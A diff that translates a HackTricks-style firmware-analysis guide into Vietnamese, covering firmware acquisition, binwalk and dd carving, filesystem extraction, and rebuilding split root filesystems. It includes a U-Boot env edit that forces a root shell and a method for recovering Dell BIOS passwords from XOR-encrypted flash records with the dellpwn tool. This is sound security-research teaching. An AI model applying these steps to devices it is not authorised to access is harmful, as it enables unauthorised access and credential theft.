@@ -1,4 +1,4 @@
-# Firmware Analysis
+# Phân tích Firmware
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -6,11 +6,11 @@
 ../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
 {{#endref}}
 
-## **Introduction**
+## **Giới thiệu**
 
-### Related resources
+### Tài nguyên liên quan
 
-For acquisition from exposed hardware interfaces, see [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) and [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). For a repeatable boot-time UART capture before console access, see [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).
+Để trích xuất firmware qua các giao diện phần cứng đang exposed, xem [trích xuất firmware bằng console UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) và [trích xuất SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Để ghi lại UART lặp lại được trong lúc khởi động, trước khi truy cập console, xem [thu thập dữ liệu bằng nguồn điện và oscilloscope điều khiển qua SCPI](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).
 
 {{#ref}}
 uefi-ifr-nvram-security-setting-patching.md
@@ -32,55 +32,55 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 mediatek-xflash-carbonara-da2-hash-bypass.md
 {{#endref}}
 
-Firmware is essential software that enables devices to operate correctly by managing and facilitating communication between the hardware components and the software that users interact with. It's stored in permanent memory, ensuring the device can access vital instructions from the moment it's powered on, leading to the operating system's launch. Examining and potentially modifying firmware is a critical step in identifying security vulnerabilities.<sup>[[2]](#references)[[3]](#references)</sup>
+Firmware là phần mềm thiết yếu giúp thiết bị hoạt động chính xác bằng cách quản lý và hỗ trợ giao tiếp giữa các thành phần phần cứng với phần mềm mà người dùng tương tác. Firmware được lưu trong bộ nhớ cố định, đảm bảo thiết bị có thể truy cập các chỉ thị quan trọng ngay khi bật nguồn, từ đó khởi chạy hệ điều hành. Kiểm tra và có thể sửa đổi firmware là một bước quan trọng để xác định lỗ hổng bảo mật.<sup>[[2]](#references)[[3]](#references)</sup>
 
-## **Gathering Information**
+## **Thu thập thông tin**
 
-**Gathering information** is a critical initial step in understanding a device's makeup and the technologies it uses. This process involves collecting data on:
+**Thu thập thông tin** là bước ban đầu quan trọng để hiểu cấu tạo của thiết bị và các công nghệ mà nó sử dụng. Quá trình này bao gồm thu thập dữ liệu về:
 
-- The CPU architecture and operating system it runs
-- Bootloader specifics
-- Hardware layout and datasheets
-- Codebase metrics and source locations
-- External libraries and license types
-- Update histories and regulatory certifications
-- Architectural and flow diagrams
-- Security assessments and identified vulnerabilities
+- Kiến trúc CPU và hệ điều hành thiết bị chạy
+- Thông tin cụ thể về bootloader
+- Bố cục phần cứng và datasheet
+- Số liệu về codebase và vị trí mã nguồn
+- Thư viện bên ngoài và loại giấy phép
+- Lịch sử cập nhật và chứng nhận theo quy định
+- Sơ đồ kiến trúc và luồng dữ liệu
+- Đánh giá bảo mật và các lỗ hổng đã xác định
 
-For this purpose, **open-source intelligence (OSINT)** tools are invaluable, as is the analysis of any available open-source software components through manual and automated review processes. Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) offer free static analysis that can be leveraged to find potential issues.
+Với mục đích này, các công cụ **open-source intelligence (OSINT)** vô cùng hữu ích, cũng như việc phân tích mọi thành phần phần mềm mã nguồn mở hiện có bằng các quy trình rà soát thủ công và tự động. Các công cụ như [Coverity Scan](https://scan.coverity.com) và [Semmle’s LGTM](https://lgtm.com/#explore) cung cấp tính năng phân tích tĩnh miễn phí có thể được tận dụng để tìm các vấn đề tiềm ẩn.
 
-## **Acquiring the Firmware**
+## **Thu thập Firmware**
 
-Obtaining firmware can be approached through various means, each with its own level of complexity:
+Có thể thu thập firmware bằng nhiều cách, mỗi cách có mức độ phức tạp riêng:
 
-- **Directly** from the source (developers, manufacturers)
-- **Building** it from provided instructions
-- **Downloading** from official support sites
-- Utilizing **Google dork** queries for finding hosted firmware files
-- Accessing **cloud storage** directly, with tools like [S3Scanner](https://github.com/sa7mon/S3Scanner)
-- Intercepting **updates** via man-in-the-middle techniques
-- **Extracting** from the device through connections like **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), or **PICit**
-- **Sniffing** for update requests within device communication
-- Identifying and using **hardcoded update endpoints**
-- **Dumping** from the bootloader or network
-- **Removing and reading** the storage chip, when all else fails, using appropriate hardware tools
+- Lấy **trực tiếp** từ nguồn (nhà phát triển, nhà sản xuất)
+- **Biên dịch** từ hướng dẫn được cung cấp
+- **Tải xuống** từ các trang hỗ trợ chính thức
+- Dùng truy vấn **Google dork** để tìm các tệp firmware được lưu trữ
+- Truy cập trực tiếp **cloud storage** bằng các công cụ như [S3Scanner](https://github.com/sa7mon/S3Scanner)
+- Chặn **bản cập nhật** bằng kỹ thuật man-in-the-middle
+- **Trích xuất** từ thiết bị qua các kết nối như **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) hoặc **PICit**
+- **Nghe lén** các yêu cầu cập nhật trong quá trình giao tiếp của thiết bị
+- Xác định và sử dụng các **endpoint cập nhật được hardcode**
+- **Dump** từ bootloader hoặc qua mạng
+- Khi mọi cách khác đều thất bại, **tháo và đọc** chip lưu trữ bằng các công cụ phần cứng phù hợp
 
-### UART-only logs: force a root shell via U-Boot env in flash
+### Log chỉ có UART: buộc mở root shell qua U-Boot env trong flash
 
-If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:<sup>[[6]](#references)</sup>
+Nếu UART RX bị bỏ qua (chỉ có log), bạn vẫn có thể buộc mở init shell bằng cách **chỉnh sửa blob môi trường U-Boot** ngoại tuyến:<sup>[[6]](#references)</sup>
 
-1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
+1. Dump SPI flash bằng kẹp SOIC-8 và thiết bị lập trình (3.3V):
    ```bash
    flashrom -p ch341a_spi -r flash.bin
    ```
-2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
-3. Reflash only the env partition and reboot; a shell should appear on UART.
+2. Xác định phân vùng env của U-Boot, chỉnh sửa `bootargs` để thêm `init=/bin/sh`, và **tính lại CRC32 của U-Boot env** cho blob.
+3. Flash lại chỉ phân vùng env rồi khởi động lại; một shell sẽ xuất hiện trên UART.
 
-This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.
+Cách này hữu ích trên các thiết bị nhúng mà shell của bootloader bị tắt nhưng có thể ghi vào phân vùng env thông qua truy cập flash bên ngoài.
 
-## Analyzing the firmware
+## Phân tích firmware
 
-Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
+Giờ đây bạn **đã có firmware**, cần trích xuất thông tin về nó để biết cách xử lý. Có thể dùng các công cụ khác nhau cho việc này:
 
 ```bash
 file <bin>
@@ -91,57 +91,56 @@ hexdump -C <bin> | head # might find signatures in header
 fdisk -lu <bin> #lists a drives partition and filesystems if multiple
 ```
 
-If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).
+Nếu không tìm thấy nhiều thông tin bằng các công cụ đó, hãy kiểm tra **entropy** của image bằng `binwalk -E <bin>`; entropy thấp thì image có khả năng không được mã hóa. Entropy cao thì image có khả năng được mã hóa (hoặc nén theo cách nào đó).
 
-Moreover, you can use these tools to extract **files embedded inside the firmware**:
-
+Ngoài ra, bạn có thể dùng các công cụ này để trích xuất **files được nhúng bên trong firmware**:
 
 {{#ref}}
 ../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
 {{#endref}}
 
-Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.
+Hoặc dùng [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) để kiểm tra file.
 
-### Raw display assets in external flash
+### Tài nguyên hiển thị dạng raw trong flash ngoài
 
-An external SPI dump is not necessarily the MCU's executable firmware. For a Cortex-M target, compare the start of each candidate code region with the device memory map: a normal vector table begins with a plausible SRAM stack pointer and reset-handler address in executable memory. A missing vector table at offset zero alone does not prove the entire chip has no code; inspect other offsets and the boot arrangement. If `binwalk` finds no container, inspect raw bytes and correlate flash read addresses from a [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) with actions that load new screens.<sup>[[14]](#references)</sup>
+Bản dump SPI bên ngoài không nhất thiết là firmware thực thi của MCU. Với mục tiêu Cortex-M, hãy so sánh phần đầu của từng vùng mã tiềm năng với sơ đồ bộ nhớ của thiết bị: một bảng vector thông thường bắt đầu bằng một con trỏ stack SRAM hợp lý và địa chỉ reset-handler nằm trong vùng nhớ thực thi. Chỉ riêng việc không có bảng vector tại offset 0 không chứng minh rằng toàn bộ chip không có mã; hãy kiểm tra các offset khác và cách thiết lập boot. Nếu `binwalk` không tìm thấy container, hãy kiểm tra các byte raw và đối chiếu địa chỉ đọc flash từ một [bản ghi SPI đã giải mã](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) với các thao tác tải màn hình mới.<sup>[[14]](#references)</sup>
 
-For a display-asset region, try candidate pixel formats and dimensions instead of assuming PNG/JPEG. The cited device used **80×160 RGB565 little-endian** frames: at two bytes per pixel, a frame is **25,600 bytes** (25 KiB), not 24 kilobits. A decoded flash-read address identified the screen asset's offset; the researcher converted a prepared image with `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, replaced the equally sized asset in the original dump, wrote it with `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, and confirmed the new image on the display. This demonstrates writable *external display assets*, not extraction or reflashing of the MCU's internal firmware. Keep the original dump and verify dimensions, byte order, offset, and replacement length before any write.<sup>[[14]](#references)</sup>
+Với vùng chứa tài nguyên hiển thị, hãy thử các định dạng pixel và kích thước tiềm năng thay vì mặc định rằng đó là PNG/JPEG. Thiết bị được đề cập sử dụng các frame **80×160 RGB565 little-endian**: với hai byte mỗi pixel, một frame có kích thước **25,600 bytes** (25 KiB), không phải 24 kilobits. Địa chỉ đọc flash đã giải mã giúp xác định offset của tài nguyên màn hình; nhà nghiên cứu chuyển đổi một image đã chuẩn bị bằng `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, thay thế tài nguyên có cùng kích thước trong bản dump gốc, ghi dữ liệu bằng `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, rồi xác nhận image mới hiển thị trên màn hình. Điều này chứng minh rằng *tài nguyên hiển thị bên ngoài* có thể ghi được, chứ không phải việc trích xuất hoặc nạp lại firmware bên trong MCU. Hãy giữ bản dump gốc và xác minh kích thước, thứ tự byte, offset và độ dài dữ liệu thay thế trước khi ghi.<sup>[[14]](#references)</sup>
 
-### Differential flash analysis and recoverable XOR secret stores
+### Phân tích flash vi sai và kho bí mật XOR có thể khôi phục
 
-When a firmware setting has no documented storage format, first take several matching flash reads, change **exactly one** setting, dump the complete chip again, and compare offsets. Repeating the experiment with controlled values distinguishes the setting from counters and write metadata; changes at new offsets rather than in place indicate an append-only or log-structured store. Keep deleted/tombstoned entries because their payload bytes may remain recoverable.<sup>[[12]](#references)[[13]](#references)</sup>
+Khi định dạng lưu trữ của một thiết lập firmware không được tài liệu hóa, trước tiên hãy đọc flash nhiều lần với cùng điều kiện, thay đổi **chính xác một** thiết lập, dump lại toàn bộ chip, rồi so sánh các offset. Lặp lại thử nghiệm với các giá trị được kiểm soát sẽ giúp phân biệt dữ liệu của thiết lập với bộ đếm và metadata ghi; các thay đổi xuất hiện ở offset mới thay vì ghi đè tại chỗ cho thấy kho dữ liệu chỉ ghi nối tiếp hoặc có cấu trúc dạng log. Hãy giữ lại các mục đã xóa/đánh dấu tombstone vì byte payload của chúng có thể vẫn khôi phục được.<sup>[[12]](#references)[[13]](#references)</sup>
 
 ```bash
 sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
 cmp -l baseline-1.bin changed.bin
 ```
 
-After locating the region, extract the firmware modules with tools such as `binwalk` and reverse the writer/validator in Ghidra. Confirm field boundaries, padding, key indexing, and key derivation in code instead of inferring the scheme only from ciphertext patterns.<sup>[[12]](#references)</sup>
+Sau khi xác định được vùng này, hãy trích xuất các mô-đun firmware bằng những công cụ như `binwalk` và phân tích ngược hàm ghi/kiểm tra bằng Ghidra. Hãy xác nhận ranh giới trường, padding, cách đánh chỉ mục khóa và cách dẫn xuất khóa trong code, thay vì chỉ suy đoán sơ đồ từ các mẫu ciphertext.<sup>[[12]](#references)</sup>
 
-#### Recover keys from encrypted zero padding
+#### Khôi phục khóa từ padding zero đã mã hóa
 
-As described in [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext reveals keystream bytes at the same offsets. A fixed-size field is especially exposed when its zero padding spans every index of a repeating XOR key: the encrypted padding reveals those key bytes directly because `0x00 XOR key_byte = key_byte`. If every key index is covered, reconstruct the key from the ciphertext tail and decrypt the populated bytes.<sup>[[12]](#references)</sup>
+Như mô tả trong [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), plaintext đã biết sẽ tiết lộ các byte keystream tại cùng độ lệch. Một trường có kích thước cố định đặc biệt dễ bị lộ khi padding zero của nó phủ mọi chỉ mục của khóa XOR lặp lại: padding đã mã hóa tiết lộ trực tiếp các byte khóa đó vì `0x00 XOR key_byte = key_byte`. Nếu mọi chỉ mục khóa đều được phủ, hãy dựng lại khóa từ phần cuối ciphertext rồi giải mã các byte đã được điền dữ liệu.<sup>[[12]](#references)</sup>
 
-Dell's vulnerable DVAR BIOS-password format is a concrete example: byte `0` of a 32-byte field is plaintext, while bytes `1..31` use a repeating 20-byte key.<sup>[[12]](#references)</sup>
+Định dạng mật khẩu BIOS DVAR dễ bị tấn công của Dell là một ví dụ cụ thể: byte `0` của trường 32 byte ở dạng plaintext, còn các byte `1..31` sử dụng khóa lặp lại dài 20 byte.<sup>[[12]](#references)</sup>
 
 ```text
 stored[0] = password[0]
 stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
 ```
 
-For a password length `L`, positions `L..31` were zero before XOR. When `L <= 12`, those positions cover every key index, so the complete key and password are recovered without brute force:<sup>[[12]](#references)</sup>
+Với độ dài mật khẩu `L`, các vị trí `L..31` đều là số 0 trước khi XOR. Khi `L <= 12`, các vị trí này bao phủ mọi chỉ số key, vì vậy có thể khôi phục toàn bộ key và mật khẩu mà không cần brute force:<sup>[[12]](#references)</sup>
 
 ```text
 key[(i - 1) mod 20] = stored[i]                  # padding positions
 password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
 ```
 
-#### Lift keys from historical records
+#### Trích xuất khóa từ các bản ghi lịch sử
 
-Do not analyze each record independently. The DVAR key is derived approximately as `modified_md5(device_seed || variable_GUID || password[0])`: the device seed and GUID are fixed, and the only password-dependent input is the clear first byte. This gives at most 256 keys per device and makes records beginning with the same byte share a key. Group active and deleted records by that byte; a short historical record can leak the full key through padding and decrypt a current longer record whose own padding is insufficient. Password rotation can therefore increase exposure when old ciphertext is tombstoned rather than erased.<sup>[[12]](#references)</sup>
+Không phân tích từng bản ghi riêng lẻ. Khóa DVAR được tạo gần đúng theo công thức `modified_md5(device_seed || variable_GUID || password[0])`: device seed và GUID cố định, đầu vào duy nhất phụ thuộc vào mật khẩu là byte đầu tiên ở dạng rõ. Vì vậy, mỗi thiết bị có tối đa 256 khóa, và các bản ghi bắt đầu bằng cùng một byte sẽ dùng chung khóa. Hãy nhóm các bản ghi đang hoạt động và đã xóa theo byte đó; một bản ghi lịch sử ngắn có thể làm lộ toàn bộ khóa qua phần đệm, rồi dùng khóa đó giải mã một bản ghi hiện tại dài hơn mà phần đệm của chính nó không đủ. Do đó, việc đổi mật khẩu có thể làm tăng mức độ lộ dữ liệu nếu ciphertext cũ bị đánh dấu xóa thay vì bị xóa hẳn.<sup>[[12]](#references)</sup>
 
-The [`dellpwn`](https://github.com/R3n5k1/dellpwn) tool locates DVAR, validates candidate records, recovers passwords, and can display raw stored/key bytes. Build it from a checkout and scan a verified flash image as follows:<sup>[[13]](#references)</sup>
+Công cụ [`dellpwn`](https://github.com/R3n5k1/dellpwn) tìm DVAR, xác thực các bản ghi ứng viên, khôi phục mật khẩu và có thể hiển thị byte thô đã lưu/byte khóa. Hãy build công cụ từ một bản checkout rồi quét một flash image đã được xác minh như sau:<sup>[[13]](#references)</sup>
 
 ```bash
 cargo install --path .
@@ -149,18 +148,18 @@ dellpwn scan dump.bin --raw
 dellpwn scan dump.bin --partial  # include uncertain recoveries
 ```
 
-For custom parsers, reject false positives with record structure, printable-character constraints, zero-padding checks, key entropy, and consistency where the key wraps. If repeated dumps show sparse per-write bit flips, enumerate the observed masks and rank corrections with these constraints, but report ambiguous characters instead of presenting heuristic output as exact recovery.<sup>[[12]](#references)</sup>
+Với các parser tùy chỉnh, hãy loại bỏ kết quả dương tính giả dựa trên cấu trúc bản ghi, các ràng buộc về ký tự in được, kiểm tra phần đệm bằng số 0, entropy của khóa và tính nhất quán tại vị trí khóa quay vòng. Nếu các bản dump lặp lại cho thấy một số ít bit bị lật ở mỗi lần ghi, hãy liệt kê các mask đã quan sát và xếp hạng các phương án hiệu chỉnh theo những ràng buộc này, nhưng hãy báo cáo các ký tự chưa xác định thay vì trình bày kết quả phỏng đoán như thể đã khôi phục chính xác.<sup>[[12]](#references)</sup>
 
-Password verifiers should store a salted, iterated one-way hash rather than reversible ciphertext, and log-structured stores should securely remove superseded secret material.<sup>[[12]](#references)</sup>
+Trình xác minh mật khẩu nên lưu hash một chiều có salt và qua nhiều vòng lặp, thay vì ciphertext có thể đảo ngược; các kho lưu trữ dạng log nên xóa an toàn dữ liệu bí mật đã bị thay thế.<sup>[[12]](#references)</sup>
 
-### Getting the Filesystem
+### Lấy Filesystem
 
-With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
-Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
+Với các công cụ đã chú thích trước đó, chẳng hạn như `binwalk -ev <bin>`, bạn hẳn đã có thể **trích xuất filesystem**.\
+Binwalk thường trích xuất filesystem vào **một thư mục có tên theo loại filesystem**, thường là một trong các loại sau: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.
 
-#### Manual Filesystem Extraction
+#### Trích xuất Filesystem thủ công
 
-Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
+Đôi khi, binwalk **không có magic byte của filesystem trong các chữ ký của nó**. Trong những trường hợp này, hãy dùng binwalk để **tìm offset của filesystem và trích riêng filesystem đã nén** từ binary, sau đó **trích xuất filesystem thủ công** theo loại của nó bằng các bước dưới đây.
 
 ```
 $ binwalk DIR850L_REVB.bin
@@ -174,7 +173,7 @@ DECIMAL HEXADECIMAL DESCRIPTION
 1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
 ```
 
-Run the following **dd command** carving the Squashfs filesystem.
+Chạy **dd command** sau để carving filesystem Squashfs.
 
 ```
 $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
@@ -186,37 +185,37 @@ $ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
 8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
 ```
 
-Alternatively, the following command could also be run.
+Ngoài ra, cũng có thể chạy lệnh sau.
 
 `$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`
 
-- For squashfs (used in the example above)
+- Với squashfs (được dùng trong ví dụ trên)
 
 `$ unsquashfs dir.squashfs`
 
-Files will be in "`squashfs-root`" directory afterwards.
+Các tệp sẽ nằm trong thư mục "`squashfs-root`" sau đó.
 
-- CPIO archive files
+- Các tệp archive CPIO
 
 `$ cpio -ivd --no-absolute-filenames -F <bin>`
 
-- For jffs2 filesystems
+- Với các filesystem jffs2
 
 `$ jefferson rootfsfile.jffs2`
 
-- For ubifs filesystems with NAND flash
+- Với các filesystem ubifs sử dụng NAND flash
 
 `$ ubireader_extract_images -u UBI -s <start_offset> <bin>`
 
 `$ ubidump.py <bin>`
 
-### Reconstructing split embedded root filesystems
+### Tái dựng các root filesystem nhúng bị chia tách
 
-If a raw eMMC/SSD dump contains a valid filesystem header but its metadata offsets extend beyond the nominal partition, do not immediately classify it as corrupt. Embedded boot code can assemble the real root device from multiple physical ranges with Device Mapper, so carving one GPT partition produces only the first segment.<sup>[[9]](#references)</sup>
+Nếu một bản dump eMMC/SSD thô có header filesystem hợp lệ nhưng các offset metadata vượt quá kích thước phân vùng danh nghĩa, đừng vội kết luận rằng nó bị hỏng. Mã khởi động nhúng có thể ghép thiết bị root thực từ nhiều vùng vật lý bằng Device Mapper, nên việc trích xuất dữ liệu từ một phân vùng GPT chỉ tạo ra phân đoạn đầu tiên.<sup>[[9]](#references)</sup>
 
-#### Triage the complete media image
+#### Phân loại sơ bộ toàn bộ ảnh thiết bị
 
-First verify that acquisition has finished, the size is stable, and no writer still holds the image. If the filename encodes a start/end address, compare that range with the actual byte count. Recover the GPT in read-only mode and attach only the required range; do **not** run `vgchange -ay` against an untrusted physical volume on the workstation because volume-group collisions and unintended writes are possible.<sup>[[9]](#references)</sup>
+Trước tiên, hãy xác minh rằng quá trình thu thập đã hoàn tất, kích thước ổn định và không còn tiến trình ghi nào đang giữ ảnh. Nếu tên tệp mã hóa địa chỉ bắt đầu/kết thúc, hãy so sánh phạm vi đó với số byte thực tế. Khôi phục GPT ở chế độ chỉ đọc và chỉ gắn vùng cần thiết; **không** chạy `vgchange -ay` trên physical volume không đáng tin cậy ở workstation vì có thể xảy ra xung đột volume group và ghi ngoài ý muốn.<sup>[[9]](#references)</sup>
 
 ```bash
 stat -c '%s bytes' firmware.bin
@@ -229,20 +228,20 @@ sudo losetup --find --show --read-only \
   --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
 ```
 
-Prefer a disposable VM when the original init logic or an LVM stack must see the whole image. Historical boot logs from a standard boot partition are especially useful: the bootloader may have logged proprietary-container offsets, component lengths, slot selection, alignment rules, and signature verification. Use those values to carve an embedded command line/kernel/initramfs, then validate each output independently with `file`, magic bytes, and `binwalk`; reading to end-of-container can accidentally append an initrd, ACPI object, or signature to the kernel.<sup>[[9]](#references)</sup>
+Ưu tiên dùng VM dùng một lần khi logic init ban đầu hoặc một stack LVM cần truy cập toàn bộ image. Nhật ký boot cũ từ một phân vùng boot tiêu chuẩn đặc biệt hữu ích: bootloader có thể đã ghi lại offset của proprietary container, độ dài thành phần, lựa chọn slot, quy tắc căn chỉnh và quá trình xác minh chữ ký. Dùng các giá trị đó để trích xuất command line/kernel/initramfs được nhúng, sau đó xác thực riêng từng đầu ra bằng `file`, magic bytes và `binwalk`; đọc đến cuối container có thể vô tình nối thêm initrd, đối tượng ACPI hoặc chữ ký vào kernel.<sup>[[9]](#references)</sup>
 
-#### Recover the boot-time block map
+#### Khôi phục block map lúc boot
 
-Extract the kernel's initramfs and reverse its `/init` plus any storage libraries. In [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), follow string references for `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, and partition paths; then trace the code that selects the active A/B slot and builds the table. Useful radare2 starting points are `r2 -A init`, `afl`, `pdf @ main`, and `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>
+Trích xuất initramfs của kernel và reverse `/init` cùng mọi thư viện lưu trữ. Trong [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), lần theo tham chiếu chuỗi cho `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` và đường dẫn phân vùng; sau đó truy vết đoạn code chọn slot A/B đang hoạt động và tạo bảng. Các điểm bắt đầu hữu ích trong radare2 là `r2 -A init`, `afl`, `pdf @ main` và `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>
 
-The linear target maps consecutive ranges of a virtual device onto ranges of one or more backing devices. A recovered two-segment table commonly has this shape (all positions and lengths are 512-byte sectors):<sup>[[9]](#references)[[10]](#references)</sup>
+Target linear ánh xạ các dải liên tiếp của một thiết bị ảo sang các dải trên một hoặc nhiều thiết bị backing. Một bảng hai segment được khôi phục thường có dạng sau (mọi vị trí và độ dài đều tính theo sector 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>
 
 ```text
 0              <seg1_sectors> linear /dev/mmcblk0p2 0
 <seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
 ```
 
-Reproduce the machine-code arithmetic exactly, including integer width, shifts, and unit conversions. For example, the following expression floors a byte size to a 4-KiB boundary and only then converts it to 512-byte sectors; replacing it with `p4_bytes // 512` shifts the selected tail by `p4_bytes % 4096` whenever the partition is not page-aligned.<sup>[[9]](#references)</sup>
+Tái tạo chính xác phép tính số học trong machine code, bao gồm độ rộng số nguyên, phép dịch bit và chuyển đổi đơn vị. Ví dụ, biểu thức sau làm tròn kích thước theo byte xuống ranh giới 4 KiB rồi mới chuyển đổi sang sector 512 byte; thay bằng `p4_bytes // 512` sẽ dịch phần đuôi được chọn đi `p4_bytes % 4096` khi phân vùng không căn chỉnh theo trang.<sup>[[9]](#references)</sup>
 
 ```python
 p4_sectors = (p4_bytes >> 12) << 3
@@ -250,11 +249,11 @@ effective_bytes = p4_sectors * 512
 tail_start = effective_bytes - tail_distance
 ```
 
-Reconstruct a flat analysis image by copying the ranges in table order with bounded chunks rather than loading the complete media dump into memory. This also avoids creating host-side mapper devices. Keep the GPT-derived offsets, reversed sector counts, and resulting output length as separate assertions.<sup>[[9]](#references)</sup>
+Tái dựng một ảnh phân tích phẳng bằng cách sao chép các dải theo thứ tự trong bảng, sử dụng các khối có kích thước giới hạn thay vì tải toàn bộ bản dump media vào bộ nhớ. Cách này cũng tránh tạo các thiết bị mapper ở phía host. Giữ các offset suy ra từ GPT, số sector đảo ngược và độ dài đầu ra thu được thành các assertion riêng biệt.<sup>[[9]](#references)</sup>
 
-#### Distinguish corruption from a constant reconstruction error
+#### Phân biệt lỗi hỏng dữ liệu với lỗi tái dựng cố định
 
-For SquashFS, check the `hsqs` magic and decode the little-endian 64-bit `bytes_used` field at superblock offset 40 before running `unsquashfs`. If extraction fails in several unrelated structures, search a broad window around the expected positions and require strong structural candidates: a decompressible metadata block, several consecutive valid directory entries, plausible inode fields, a root inode consistent with the inode count, or valid integrity-metadata structure. A single magic match is insufficient.<sup>[[9]](#references)</sup>
+Với SquashFS, hãy kiểm tra magic `hsqs` và giải mã trường `bytes_used` 64-bit little-endian tại offset 40 của superblock trước khi chạy `unsquashfs`. Nếu quá trình giải nén thất bại ở nhiều cấu trúc không liên quan, hãy tìm trong một vùng rộng quanh các vị trí dự kiến và yêu cầu các ứng viên có cấu trúc đáng tin cậy: một block metadata có thể giải nén, nhiều mục thư mục hợp lệ liên tiếp, các trường inode hợp lý, inode gốc nhất quán với số lượng inode hoặc cấu trúc metadata toàn vẹn hợp lệ. Chỉ một kết quả khớp magic là chưa đủ.<sup>[[9]](#references)</sup>
 
 ```python
 import struct
@@ -267,17 +266,17 @@ nominal_end = (bytes_used + 4095) & ~4095
 print(hex(bytes_used), hex(nominal_end))
 ```
 
-When the same signed delta makes independent structures valid—for example, directory metadata and a verity record—the likely cause is a systematic segment-start error rather than missing bytes. Return to the reversed arithmetic and look for discarded remainders, signedness, overflow, or sector/page rounding before attempting orphan recovery or patching filesystem metadata.<sup>[[9]](#references)</sup>
+Khi cùng một độ lệch có dấu khiến các cấu trúc độc lập trở nên hợp lệ—ví dụ như metadata thư mục và bản ghi verity—nguyên nhân nhiều khả năng là lỗi tính toán có hệ thống ở điểm bắt đầu của segment, chứ không phải thiếu byte. Hãy quay lại phép tính đảo ngược và kiểm tra phần dư bị loại bỏ, signedness, tràn số hoặc việc làm tròn theo sector/page trước khi thử khôi phục orphan hoặc vá metadata hệ thống tệp.<sup>[[9]](#references)</sup>
 
-Finally, keep protection boundaries separate: TPM-sealed LUKS volumes protect data confidentiality, whereas a signed dm-verity mapping protects root-filesystem integrity. A software TPM does not recover a key sealed to the original physical TPM, and booting a modified SquashFS through a research-only init that omits verity verification does not forge its signature or break dm-verity.<sup>[[9]](#references)</sup>
+Cuối cùng, hãy phân biệt rõ các ranh giới bảo vệ: volume LUKS được niêm phong bằng TPM bảo vệ tính bí mật của dữ liệu, trong khi ánh xạ dm-verity có chữ ký bảo vệ tính toàn vẹn của root filesystem. TPM phần mềm không thể khôi phục khóa được niêm phong với TPM vật lý ban đầu, và khởi động một SquashFS đã sửa đổi bằng init chỉ dành cho nghiên cứu, vốn bỏ qua bước xác minh verity, không làm giả chữ ký hay phá vỡ dm-verity.<sup>[[9]](#references)</sup>
 
-## Analyzing Firmware
+## Phân tích Firmware
 
-Once the firmware is obtained, it's essential to dissect it for understanding its structure and potential vulnerabilities. This process involves utilizing various tools to analyze and extract valuable data from the firmware image.
+Sau khi lấy được firmware, việc phân tích kỹ lưỡng để hiểu cấu trúc và các lỗ hổng tiềm ẩn của nó là rất quan trọng. Quá trình này bao gồm việc sử dụng nhiều công cụ để phân tích và trích xuất dữ liệu hữu ích từ image firmware.
 
